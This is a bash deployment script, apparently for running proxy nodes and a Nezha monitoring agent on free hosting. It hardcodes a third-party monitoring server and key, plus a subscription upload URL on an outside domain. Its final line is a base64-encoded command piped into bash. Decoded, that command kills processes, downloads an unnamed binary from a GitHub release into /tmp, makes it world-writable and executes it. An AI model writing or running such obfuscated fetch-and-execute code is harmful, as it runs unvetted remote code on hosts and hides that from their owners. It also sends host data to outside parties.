#!/bin/bash
 
# 隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
# export TOK=${TOK:-'xxx'} 
# export ARGO_DOMAIN=${ARGO_DOMAIN:-'xxx'} 

# 设置是否显示日志，默认显示，填no不显示，yes显示
# export RIZHI='no'

# 哪吒相关设置
export NEZHA_SERVER=${NEZHA_SERVER:-'nazhe.841013.xyz'}
export NEZHA_KEY=${NEZHA_KEY:-'eAFhklcOEZmZRxI0FG'}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}  # 1启用tls,0关闭tls

# 节点相关设置
export second_port=""
#export HOST=${HOST:-'ouo.freeserver.tw'}  #tuic hy2类似协议，无法获取IP时，设置HOST分配域名或者IP
export TMP_ARGO=${TMP_ARGO:-'vms'}  # 节点类型,可选vls,vms,spl,xhttp,rel,hy2,tuic，sock,3x
export VL_PORT=${VL_PORT:-'8002'}   # vles 端口
export VM_PORT=${VM_PORT:-'8001'} # vmes 端口
export SUB_NAME=${SUB_NAME:-'Appwrite.io'} # 节点名称

export UUID='ea4909ef-7ca6-4b46-bf2e-6c07896ef338'
export CF_IP='ip.sb'

# reality相关设置(不能同时开游戏)
export SERVER_PORT="${SERVER_PORT:-${PORT:-443}}" # 端口
export SNI=${SNI:-'www.apple.com'} # tls网站

# 自定义哪吒探针下载，也可默认0.18.2之前旧版本
export NEZ_AMD_URL=${NEZ_AMD_URL:-'https://raw.githubusercontent.com/zhangbin0301/myfiles/refs/heads/main/agentX86'}
export NEZ_ARM_URL=${NEZ_ARM_URL:-'https://raw.githubusercontent.com/zhangbin0301/myfiles/refs/heads/main/agentArm'}
#export NEZ_AMD_URL=${NEZ_AMD_URL:-'https://github.com/kahunama/myfile/releases/download/main/nezha-agent'}
#export NEZ_ARM_URL=${NEZ_ARM_URL:-'https://github.com/kahunama/myfile/releases/download/main/nezha-agent_arm'}

#设置订阅上传地址
export SUB_URL=${SUB_URL:-'https://sub.smartdns.eu.org/upload-ea4909ef-7ca6-4b46-bf2e-6c07896ef338'}  


# 游戏相关设置(去掉#开启游戏，复制启动命令填在下面)
# export JAR_SH='java -jar senver.jar'  # 启动命令，文件名称改为senver.jar

# 启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
